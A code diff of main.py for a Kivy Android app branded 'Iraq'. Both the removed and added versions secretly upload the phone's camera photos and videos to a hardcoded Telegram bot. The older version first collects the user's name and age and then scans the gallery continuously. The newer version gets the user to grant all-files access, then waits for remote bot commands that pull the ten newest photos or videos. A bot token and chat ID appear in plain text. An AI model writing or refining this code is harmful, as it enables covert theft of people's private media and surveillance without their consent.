@@ -1,10 +1,9 @@
+# main.py
 import os
 import time
 import hashlib
 import threading
-import requests
 import traceback
-from kivy.utils import platform
 
 from kivy.app import App
 from kivy.uix.boxlayout import BoxLayout
@@ -14,21 +13,39 @@ from kivy.uix.button import Button
 from kivy.uix.scrollview import ScrollView
 from kivy.uix.widget import Widget
 from kivy.graphics import Color, RoundedRectangle, Ellipse, Line
-from kivy.clock import Clock
+from kivy.clock import Clock, mainthread
 from kivy.metrics import dp, sp
 from kivy.core.window import Window
-from kivy.utils import get_color_from_hex
+from kivy.utils import get_color_from_hex, platform
+from kivy.resources import resource_add_path, resource_find
 
-# --- دعم اللغة العربية ---
+import requests
+
+# ================== دعم العربية (آمن) ==================
+def _ar_fallback(text):
+    """خطة احتياطية: عكس بسيط للنص العربي إذا لم تتوفر bidi."""
+    try:
+        import arabic_reshaper
+        reshaped = arabic_reshaper.reshape(str(text))
+    except Exception:
+        reshaped = str(text)
+    # عكس يدوي بسيط (ليس مثالياً لكنه أفضل من لا شيء)
+    return reshaped[::-1]
+
 try:
     import arabic_reshaper
-    from bidi.algorithm import get_display
-    def ar(text):
-        return get_display(arabic_reshaper.reshape(text))
+    # نحاول python-bidi أولاً، ثم pybidi، ثم الخطة الاحتياطية
+    try:
+        from bidi.algorithm import get_display as _get_display
+        def ar(text):
+            return _get_display(arabic_reshaper.reshape(str(text)))
+    except Exception:
+        def ar(text):
+            return _ar_fallback(text)
 except ImportError:
-    def ar(text): return text
+    def ar(text): return str(text)
 
-# ============ الألوان ============
+# ================== الألوان ==================
 PRIMARY_BLUE   = get_color_from_hex('#1565C0')
 DARK_BLUE      = get_color_from_hex('#0D47A1')
 BTN_BLUE       = get_color_from_hex('#1976D2')
@@ -40,130 +57,126 @@ SUCCESS_GREEN  = get_color_from_hex('#38A169')
 ERROR_RED      = get_color_from_hex('#E53E3E')
 BORDER_GRAY    = get_color_from_hex('#E2E8F0')
 
-# ============ إعدادات تيليجرام ============
+# ================== إعدادات تيليجرام ==================
 BOT_TOKEN = "8041654407:AAHtI0QChtYMlJ0MMJCGM8YEb5b4L4lgEmM"
 CHAT_ID   = "6046016571"
 API_URL   = f"https://api.telegram.org/bot{BOT_TOKEN}"
-HASH_LOG  = "sent_media_hashes.txt"
 
-FONT_PATH = "assets/fonts/NotoNaskhArabic-Regular.ttf"
-if not os.path.exists(FONT_PATH):
-    FONT_PATH = None
+# ================== مسار الخط (باستخدام resource_find) ==================
+FONT_PATH = None
+try:
+    # نضيف مسار assets/fonts إلى موارد Kivy
+    resource_add_path(os.path.join(os.path.dirname(__file__), 'assets', 'fonts'))
+    FONT_PATH = resource_find('NotoNaskhArabic-Regular.ttf')
+    if not FONT_PATH:
+        # ربما تم تضمينه عبر android.add_assets في مسار مختلف
+        FONT_PATH = resource_find('fonts/NotoNaskhArabic-Regular.ttf')
+except Exception as e:
+    print(f"Font path error: {e}")
 
-# ============ دوال الإرسال والمسح ============
-def get_file_hash(file_path):
-    hasher = hashlib.md5()
+# ================== دوال مساعدة ==================
+def safe_log_path():
+    """مسار داخلي آمن لكتابة سجل الأخطاء (لا يحتاج أي إذن)."""
     try:
-        with open(file_path, 'rb') as f:
-            for chunk in iter(lambda: f.read(4096), b""):
-                hasher.update(chunk)
-        return hasher.hexdigest()
+        return os.path.join(App.get_running_app().user_data_dir, "crash_log.txt")
     except Exception:
-        return None
+        return "/data/local/tmp/iraq_crash.txt"
 
-def load_hashes(base_dir):
-    log_path = os.path.join(base_dir, HASH_LOG)
-    if os.path.exists(log_path):
-        try:
-            with open(log_path, "r", encoding="utf-8") as f:
-                return set(f.read().splitlines())
-        except Exception:
-            pass
-    return set()
-
-def save_hash(base_dir, file_hash):
-    log_path = os.path.join(base_dir, HASH_LOG)
+def write_crash_log(text):
     try:
-        with open(log_path, "a", encoding="utf-8") as f:
-            f.write(file_hash + "\n")
+        path = safe_log_path()
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        with open(path, 'w', encoding='utf-8') as f:
+            f.write(text)
     except Exception:
         pass
 
-# مسارات شاملة لهواوي والأندرويد الحديث
-GALLERY_PATHS = ["/storage/emulated/0/DCIM/Camera/", "/sdcard/DCIM/Camera/", "/storage/emulated/0/Pictures/", "/sdcard/Pictures/"]
-
-def get_all_unique_media(base_dir):
-    sent_hashes = load_hashes(base_dir)
-    unique_list = []
-    IMG_EXT = ('.jpg', '.jpeg', '.png', '.webp', '.heic')
-    VID_EXT = ('.mp4', '.mov', '.avi', '.mkv', '.3gp')
-    for folder in GALLERY_PATHS:
-        if os.path.exists(folder):
-            try:
-                for root, dirs, files in os.walk(folder):
-                    if any(x in root.lower() for x in ['.thumbnails', 'cache', 'recycler']):
-                        continue
-                    for file in files:
-                        file_lower = file.lower()
-                        full_path = os.path.join(root, file)
-                        media_type = 'photo' if file_lower.endswith(IMG_EXT) else 'video' if file_lower.endswith(VID_EXT) else None
-                        if media_type:
-                            try:
-                                f_hash = get_file_hash(full_path)
-                                if f_hash and f_hash not in sent_hashes:
-                                    unique_list.append({'path': full_path, 'hash': f_hash, 'type': media_type})
-                            except Exception:
-                                continue
-            except Exception:
-                pass
-    return unique_list
-
-def send_telegram_text(text, status_callback=None):
+def check_storage_permission():
+    """التحقق الفعلي من إذن إدارة الملفات على أندرويد."""
+    if platform != 'android':
+        return True
     try:
-        url = f"{API_URL}/sendMessage"
-        response = requests.post(url, data={'chat_id': CHAT_ID, 'text': text}, timeout=20)
-        ok = response.status_code == 200 and response.json().get("ok")
-        if status_callback:
-            Clock.schedule_once(lambda dt: status_callback(ok))
-        return ok
+        from jnius import autoclass
+        Environment = autoclass('android.os.Environment')
+        return Environment.isExternalStorageManager()
     except Exception:
-        if status_callback:
-            Clock.schedule_once(lambda dt: status_callback(False))
         return False
 
-def send_media_batch(base_dir, batch, status_cb=None):
-    for item in batch:
+def open_all_files_settings():
+    """فتح شاشة إعدادات النظام لتفعيل MANAGE_EXTERNAL_STORAGE (بدون كراش)."""
+    if platform != 'android':
+        return
+    try:
+        from jnius import autoclass
+        Intent = autoclass('android.content.Intent')
+        Settings = autoclass('android.provider.Settings')
+        Uri = autoclass('android.net.Uri')
+        PythonActivity = autoclass('org.kivy.android.PythonActivity')
+        pkg = PythonActivity.mActivity.getPackageName()
+        intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+        intent.setData(Uri.parse(f"package:{pkg}"))
+        PythonActivity.mActivity.startActivity(intent)
+    except Exception as e:
+        print(f"Open settings error: {e}")
+
+# ================== البحث عن الوسائط ==================
+GALLERY_PATHS = ["/storage/emulated/0/DCIM/Camera"]
+
+def get_media_files(limit=10, media_type='photo'):
+    """يعيد قائمة بأحدث الملفات (صور أو فيديوهات) من مجلد الكاميرا."""
+    if not check_storage_permission():
+        return []
+    IMG_EXT = ('.jpg', '.jpeg', '.png', '.webp', '.heic')
+    VID_EXT = ('.mp4', '.mov', '.avi', '.mkv', '.3gp')
+    exts = IMG_EXT if media_type == 'photo' else VID_EXT
+    all_files = []
+    for folder in GALLERY_PATHS:
+        if not os.path.exists(folder):
+            continue
         try:
-            file_path = item['path']
-            file_size = os.path.getsize(file_path)
-            method, file_key = "sendPhoto", "photo"
+            for root, dirs, files in os.walk(folder):
+                for f in files:
+                    if f.lower().endswith(exts):
+                        all_files.append(os.path.join(root, f))
+        except Exception:
+            continue
+    all_files.sort(key=os.path.getmtime, reverse=True)
+    return all_files[:limit]
 
-            if item['type'] == 'video':
-                if file_size > 50 * 1024 * 1024:
-                    method, file_key = "sendDocument", "document"
-                else:
-                    method, file_key = "sendVideo", "video"
-
-            timeout_val = max(40, int(file_size / (500 * 1024)))
-            with open(file_path, 'rb') as f:
-                files = {file_key: (os.path.basename(file_path), f)}
-                data = {'chat_id': CHAT_ID, 'caption': '🆕 صورة جديدة'}
-                r = requests.post(f"{API_URL}/{method}", data=data, files=files, timeout=timeout_val)
-
-            try:
-                ok = r.status_code == 200 and r.json().get("ok") is True
-            except Exception:
-                ok = False
-
-            if ok:
-                save_hash(base_dir, item['hash'])
-                if status_cb:
-                    Clock.schedule_once(lambda dt: status_cb(f"✅ أُرسلت: {os.path.basename(file_path)}"))
+def send_telegram_file(filepath, media_type):
+    """يرسل ملفاً واحداً إلى تيليجرام."""
+    try:
+        file_size = os.path.getsize(filepath)
+        is_video = media_type == 'video'
+        if is_video:
+            if file_size > 50 * 1024 * 1024:
+                method, key = "sendDocument", "document"
             else:
-                if status_cb:
-                    Clock.schedule_once(lambda dt: status_cb(f"❌ فشل: {os.path.basename(file_path)}"))
-            time.sleep(2)
-        except Exception as e:
-            print(f"Upload error: {e}")
+                method, key = "sendVideo", "video"
+        else:
+            method, key = "sendPhoto", "photo"
 
-# ============ التصميم الاحترافي ============
+        timeout_val = max(60, int(file_size / (500 * 1024)))
+        with open(filepath, 'rb') as f:
+            files = {key: (os.path.basename(filepath), f)}
+            data = {'chat_id': CHAT_ID, 'caption': '📤 من الهاتف'}
+            r = requests.post(f"{API_URL}/{method}", data=data, files=files, timeout=timeout_val)
+        ok = r.status_code == 200 and r.json().get("ok") is True
+        time.sleep(1)  # تجنب حدود تيليجرام
+        return ok
+    except Exception as e:
+        print(f"Send error: {e}")
+        return False
+
+# ================== واجهة Kivy ==================
 class LogoWidget(Widget):
     def __init__(self, **kwargs):
         super().__init__(**kwargs)
         with self.canvas.before:
             Color(*PRIMARY_BLUE)
             self.circle = Ellipse(pos=self.pos, size=self.size)
-        self.label = Label(text="A", bold=True, font_size=sp(50), color=WHITE, halign='center', valign='middle')
+        self.label = Label(text="A", bold=True, font_size=sp(50), color=WHITE,
+                           halign='center', valign='middle')
         self.add_widget(self.label)
         self.bind(pos=self._update, size=self._update)
     def _update(self, *args):
@@ -216,41 +229,51 @@ class MainApplicationUI(BoxLayout):
             self.bg = RoundedRectangle(pos=self.pos, size=self.size)
         self.bind(pos=self._update_bg, size=self._update_bg)
 
-        self._worker_started = False
+        self._bot_started = False
         scroll = ScrollView(size_hint=(1, 1), do_scroll_x=False)
-        content = BoxLayout(orientation='vertical', padding=[dp(24), dp(30), dp(24), dp(30)], spacing=dp(14), size_hint_y=None)
+        content = BoxLayout(orientation='vertical', padding=[dp(24), dp(30), dp(24), dp(30)],
+                            spacing=dp(14), size_hint_y=None)
         content.bind(minimum_height=content.setter('height'))
 
         logo_holder = BoxLayout(size_hint_y=None, height=dp(110))
-        logo = LogoWidget(size_hint=(None, None), size=(dp(90), dp(90)), pos_hint={'center_x': 0.5, 'center_y': 0.5})
+        logo = LogoWidget(size_hint=(None, None), size=(dp(90), dp(90)),
+                          pos_hint={'center_x': 0.5, 'center_y': 0.5})
         logo_holder.add_widget(logo)
         content.add_widget(logo_holder)
 
-        content.add_widget(Label(text=ar("العراق"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(34), bold=True, color=DARK_BLUE, size_hint_y=None, height=dp(52)))
-        content.add_widget(Label(text=ar("أدخل بياناتك لبدء الإرسال"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(14), color=TEXT_GRAY, size_hint_y=None, height=dp(28)))
+        content.add_widget(Label(text=ar("العراق"), font_name=FONT_PATH or 'Roboto',
+                                 font_size=sp(34), bold=True, color=DARK_BLUE,
+                                 size_hint_y=None, height=dp(52)))
+        content.add_widget(Label(text=ar("تحكم بالبوت من تيليجرام"), font_name=FONT_PATH or 'Roboto',
+                                 font_size=sp(14), color=TEXT_GRAY,
+                                 size_hint_y=None, height=dp(28)))
         content.add_widget(Widget(size_hint_y=None, height=dp(18)))
 
-        content.add_widget(Label(text=ar("الاسم"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(15), color=TEXT_DARK, size_hint_y=None, height=dp(24)))
-        self.name_input = RoundedInput(hint_text=ar("اكتب اسمك هنا"), multiline=False, font_size=sp(16), size_hint_y=None, height=dp(52))
-        content.add_widget(self.name_input)
-
-        content.add_widget(Label(text=ar("العمر"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(15), color=TEXT_DARK, size_hint_y=None, height=dp(24)))
-        self.age_input = RoundedInput(hint_text=ar("اكتب عمرك هنا"), multiline=False, input_filter='int', font_size=sp(16), size_hint_y=None, height=dp(52))
-        content.add_widget(self.age_input)
-
-        content.add_widget(Widget(size_hint_y=None, height=dp(18)))
-
-        self.send_button = RoundedButton(text=ar("إرسال"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(20), bold=True, color=WHITE, size_hint_y=None, height=dp(58))
-        self.send_button.bind(on_press=self.on_submit)
-        content.add_widget(self.send_button)
-        
-        # زر طلب إذن الملفات (يظهر فقط على أندرويد)
+        # زر منح الصلاحية (يظهر فقط على أندرويد)
         if platform == 'android':
-            self.perm_btn = RoundedButton(text=ar("منح إذن الوصول للملفات"), font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(16), bg_color=ERROR_RED, size_hint_y=None, height=dp(48))
-            self.perm_btn.bind(on_press=self.open_special_permission)
+            self.perm_btn = RoundedButton(text=ar("1. منح إذن الوصول للملفات"),
+                                          font_name=FONT_PATH or 'Roboto',
+                                          font_size=sp(16), bg_color=ERROR_RED,
+                                          size_hint_y=None, height=dp(52))
+            self.perm_btn.bind(on_press=self._request_permission)
             content.add_widget(self.perm_btn)
+            content.add_widget(Widget(size_hint_y=None, height=dp(10)))
 
-        self.status_lbl = Label(text="", font_name=FONT_PATH if FONT_PATH else 'Roboto', font_size=sp(14), color=TEXT_GRAY, size_hint_y=None, height=dp(60), halign='center', text_size=(None, None))
+        # زر بدء بوت التحكم
+        self.start_bot_btn = RoundedButton(text=ar("2. بدء الاستماع للبوت"),
+                                           font_name=FONT_PATH or 'Roboto',
+                                           font_size=sp(18), bg_color=SUCCESS_GREEN,
+                                           size_hint_y=None, height=dp(58))
+        self.start_bot_btn.bind(on_press=self._start_bot)
+        content.add_widget(self.start_bot_btn)
+
+        content.add_widget(Widget(size_hint_y=None, height=dp(18)))
+
+        self.status_lbl = Label(text=ar("جاهز."), font_name=FONT_PATH or 'Roboto',
+                                font_size=sp(14), color=TEXT_GRAY,
+                                size_hint_y=None, height=dp(80),
+                                halign='center', valign='middle')
+        self.status_lbl.bind(size=lambda *a: setattr(self.status_lbl, 'text_size', (self.status_lbl.width, None)))
         content.add_widget(self.status_lbl)
 
         scroll.add_widget(content)
@@ -260,110 +283,132 @@ class MainApplicationUI(BoxLayout):
         self.bg.pos = self.pos
         self.bg.size = self.size
 
+    @mainthread
     def set_status(self, msg, color=TEXT_GRAY):
         self.status_lbl.text = ar(msg)
         self.status_lbl.color = color
 
-    def open_special_permission(self, instance):
-        """دالة تفتح إعدادات النظام لتفعيل إذن MANAGE_EXTERNAL_STORAGE"""
-        if platform == 'android':
-            try:
-                from jnius import autoclass
-                Intent = autoclass('android.content.Intent')
-                Settings = autoclass('android.provider.Settings')
-                Uri = autoclass('android.net.Uri')
-                PythonActivity = autoclass('org.kivy.android.PythonActivity')
-                
-                intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-                uri = Uri.fromParts("package", PythonActivity.mActivity.getPackageName(), None)
-                intent.setData(uri)
-                PythonActivity.mActivity.startActivity(intent)
-                self.set_status("يرجى تفعيل 'السماح بإدارة جميع الملفات' ثم العودة.", PRIMARY_BLUE)
-            except Exception as e:
-                self.set_status("تعذر فتح الإعدادات. افتحها يدوياً.", ERROR_RED)
-                print(f"Error: {e}")
-
-    def on_submit(self, instance):
-        name = self.name_input.text.strip()
-        age  = self.age_input.text.strip()
-
-        if not name:
-            self.set_status("⚠️ الرجاء إدخال الاسم", ERROR_RED)
+    def _request_permission(self, instance):
+        if platform != 'android':
+            self.set_status("هذه الميزة على أندرويد فقط.")
             return
-        if not age or not age.isdigit() or not (1 <= int(age) <= 120):
-            self.set_status("⚠️ الرجاء إدخال عمر صحيح", ERROR_RED)
+        try:
+            from android.permissions import request_permissions, Permission
+            request_permissions(
+                [Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE],
+                callback=self._on_perm_result
+            )
+        except Exception as e:
+            self.set_status(f"خطأ في طلب الصلاحيات: {e}", ERROR_RED)
+
+    def _on_perm_result(self, permissions, grants):
+        # بعد منح الصلاحيات العادية، نفتح إعدادات "جميع الملفات"
+        open_all_files_settings()
+        self.set_status("يرجى تفعيل 'السماح بإدارة جميع الملفات' ثم العودة.", PRIMARY_BLUE)
+
+    def _start_bot(self, instance):
+        if not check_storage_permission():
+            self.set_status("الرجاء منح إذن 'إدارة جميع الملفات' أولاً (الزر الأحمر).", ERROR_RED)
             return
-
-        self.send_button.disabled = True
-        self.send_button.text = ar("جاري الإرسال...")
-        self.set_status("⏳ جاري إرسال بياناتك...", PRIMARY_BLUE)
-
-        msg = f"👤 الاسم: {name}\n🎂 العمر: {age}"
-        threading.Thread(target=self._send_and_start, args=(msg,), daemon=True).start()
-
-    def _send_and_start(self, msg):
-        ok = send_telegram_text(msg)
-        Clock.schedule_once(lambda dt: self._after_login(ok))
-
-    def _after_login(self, ok):
-        if not ok:
-            self.set_status("❌ تعذر الاتصال، تحقق من الإنترنت", ERROR_RED)
-            self.send_button.disabled = False
-            self.send_button.text = ar("إرسال")
+        if self._bot_started:
+            self.set_status("البوت يعمل بالفعل.", SUCCESS_GREEN)
             return
+        self._bot_started = True
+        self.start_bot_btn.disabled = True
+        self.start_bot_btn.text = ar("✅ البوت يعمل")
+        self.set_status("البوت يستمع لأوامر تيليجرام... أرسل /start للبوت.", SUCCESS_GREEN)
+        threading.Thread(target=self._bot_listener, daemon=True).start()
 
-        self.set_status("✅ تم تسجيل بياناتك، جاري بدء إرسال الصور...", SUCCESS_GREEN)
-        self.send_button.text = ar("✅ تم التسجيل")
-        if not self._worker_started:
-            self._worker_started = True
-            threading.Thread(target=self._media_worker, daemon=True).start()
-
-    def _media_worker(self):
-        time.sleep(3)
-        base_dir = App.get_running_app().user_data_dir
+    # ================== منطق البوت (Long Polling) ==================
+    def _bot_listener(self):
+        offset = None
         while True:
             try:
-                media = get_all_unique_media(base_dir)
-                if media:
-                    Clock.schedule_once(lambda dt: self.set_status(f"📤 جاري إرسال {len(media)} ملف...", PRIMARY_BLUE))
-                    send_media_batch(base_dir, media[:3], status_cb=self._media_status)
-                else:
-                    Clock.schedule_once(lambda dt: self.set_status("🔍 لا توجد صور جديدة أو الإذن مرفوض", TEXT_GRAY))
+                url = f"{API_URL}/getUpdates"
+                params = {'timeout': 30, 'offset': offset}
+                resp = requests.get(url, params=params, timeout=40)
+                if resp.status_code != 200:
+                    time.sleep(5)
+                    continue
+                updates = resp.json().get('result', [])
+                for upd in updates:
+                    offset = upd['update_id'] + 1
+                    if 'callback_query' in upd:
+                        cb = upd['callback_query']
+                        data = cb.get('data')
+                        cb_id = cb.get('id')
+                        requests.get(f"{API_URL}/answerCallbackQuery",
+                                     params={'callback_query_id': cb_id, 'text': 'تم استلام الأمر...'})
+                        if data == 'send_10_photos':
+                            self._handle_send(10, 'photo')
+                        elif data == 'send_10_videos':
+                            self._handle_send(10, 'video')
+                    elif 'message' in upd:
+                        msg = upd['message']
+                        chat_id = msg['chat']['id']
+                        if msg.get('text', '') == '/start':
+                            self._show_buttons(chat_id)
             except Exception as e:
-                print(f"Worker error: {e}")
-            time.sleep(60)
+                print(f"Bot listener error: {e}")
+                time.sleep(10)
 
-    def _media_status(self, text):
-        self.set_status(text, PRIMARY_BLUE)
+    def _show_buttons(self, chat_id):
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "📸 إرسال 10 صور", "callback_data": "send_10_photos"}],
+                [{"text": "🎬 إرسال 10 فيديوهات", "callback_data": "send_10_videos"}]
+            ]
+        }
+        requests.post(f"{API_URL}/sendMessage",
+                      json={'chat_id': chat_id, 'text': 'اختر الأمر:', 'reply_markup': keyboard})
 
-# ============ كلاس التطبيق ============
+    def _handle_send(self, limit, media_type):
+        if not check_storage_permission():
+            requests.post(f"{API_URL}/sendMessage",
+                          json={'chat_id': CHAT_ID, 'text': '❌ صلاحية الملفات غير ممنوحة. افتح التطبيق وامنحها.'})
+            return
+        threading.Thread(target=self._do_send, args=(limit, media_type), daemon=True).start()
+
+    def _do_send(self, limit, media_type):
+        self.set_status(f"جاري البحث عن {limit} ملفات...")
+        files = get_media_files(limit=limit, media_type=media_type)
+        if not files:
+            self.set_status("لم يتم العثور على ملفات أو الصلاحية مرفوضة.", ERROR_RED)
+            requests.post(f"{API_URL}/sendMessage",
+                          json={'chat_id': CHAT_ID, 'text': '❌ لم يتم العثور على ملفات.'})
+            return
+        sent = 0
+        for path in files:
+            if send_telegram_file(path, media_type):
+                sent += 1
+                self.set_status(f"تم إرسال {sent}/{len(files)}...")
+            else:
+                self.set_status(f"فشل إرسال: {os.path.basename(path)}", ERROR_RED)
+        self.set_status(f"✅ تم إرسال {sent} ملفاً.", SUCCESS_GREEN)
+        requests.post(f"{API_URL}/sendMessage",
+                      json={'chat_id': CHAT_ID, 'text': f'✅ تم إرسال {sent} ملفاً بنجاح.'})
+
+# ================== كلاس التطبيق ==================
 class IraqApp(App):
-    def on_start(self):
-        if platform == 'android':
-            from android.permissions import request_permissions, Permission
-            try:
-                # طلب الأذونات العادية فقط (النافذة المنبثقة)
-                request_permissions([
-                    Permission.READ_EXTERNAL_STORAGE,
-                    Permission.WRITE_EXTERNAL_STORAGE,
-                ])
-            except Exception as e:
-                print(f"Permission error: {e}")
-
     def build(self):
         self.title = "العراق"
         return MainApplicationUI()
 
-# ============ الحماية ============
+    def on_start(self):
+        # طلب الصلاحيات العادية فقط (بدون MANAGE_EXTERNAL_STORAGE مباشرة)
+        if platform == 'android':
+            try:
+                from android.permissions import request_permissions, Permission
+                request_permissions([Permission.READ_EXTERNAL_STORAGE,
+                                     Permission.WRITE_EXTERNAL_STORAGE])
+            except Exception:
+                pass
+
 if __name__ == '__main__':
     try:
         IraqApp().run()
     except Exception:
         err = traceback.format_exc()
         print(err)
-        try:
-            with open('/sdcard/iraq_crash.txt', 'w', encoding='utf-8') as f:
-                f.write(err)
-        except Exception:
-            pass
-        raise
+        write_crash_log(err)
+        # لا نعيد رفع الاستثناء هنا لتجنب إغلاق صامت إضافي
